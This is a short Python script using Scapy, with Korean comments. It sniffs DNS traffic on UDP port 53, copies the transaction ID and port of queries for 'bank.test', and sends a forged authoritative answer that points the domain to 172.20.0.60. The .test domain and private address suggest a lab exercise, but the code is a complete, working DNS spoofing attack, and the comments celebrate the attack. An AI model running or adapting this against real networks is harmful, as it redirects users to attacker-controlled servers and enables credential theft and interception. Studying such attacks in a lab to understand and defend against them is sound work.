from scapy.all import *

TARGET_DOMAIN = b"bank.test"
FAKE_IP = "172.20.0.60"

def intercept_and_spoof(pkt):
    # 1. 엿들은 패킷이 DNS 질의(DNSQR)이고, 우리가 노리는 bank.test가 맞는지 확인
    if pkt.haslayer(DNSQR) and TARGET_DOMAIN in pkt[DNS].qd.qname:
        
        stolen_txid = pkt[DNS].id
        stolen_port = pkt[UDP].sport
        print(f"\n[!] 타겟 포착!")
        print(f" └─ 훔친 TXID : {stolen_txid}")
        print(f" └─ 훔친 Port : {stolen_port}")

        # 2. 훔친 정보를 바탕으로 완벽한 위조 응답 조립
        spoofed_pkt = (
            # 방향을 반대로! (목적지는 리졸버, 출발지는 권한서버인 척)
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            
            # 포트도 반대로! (훔친 Source 포트로 정확히 쏴줌)
            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
            
            # DNS 응답 데이터 조작 (핵심)
            DNS(
                id=pkt[DNS].id,          # 훔친 TXID 그대로 사용
                qr=1,                    # 1: 질문이 아니라 '응답'이라는 뜻
                aa=1,                    # 1: 내가 바로 '권한 있는 서버'다!
                qd=pkt[DNS].qd,          # 질문 내용은 원본 그대로 유지
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=FAKE_IP) # 가짜 답변(172.20.0.60) 추가!
            )
        )

        # 3. 탕! (단 1개의 패킷 전송)
        send(spoofed_pkt, verbose=0)
        print("💥 [대성공] 단 한 발의 위조 패킷으로 뇌쇄 완료!\n")

print("[*] 스나이퍼 모드 장전 완료. 타겟의 쿼리를 숨죽여 기다리는 중...")
# udp 53번 포트(DNS) 통신만 걸러서 엿듣다가 발견하면 함수 실행
sniff(filter="udp port 53", prn=intercept_and_spoof, store=0)
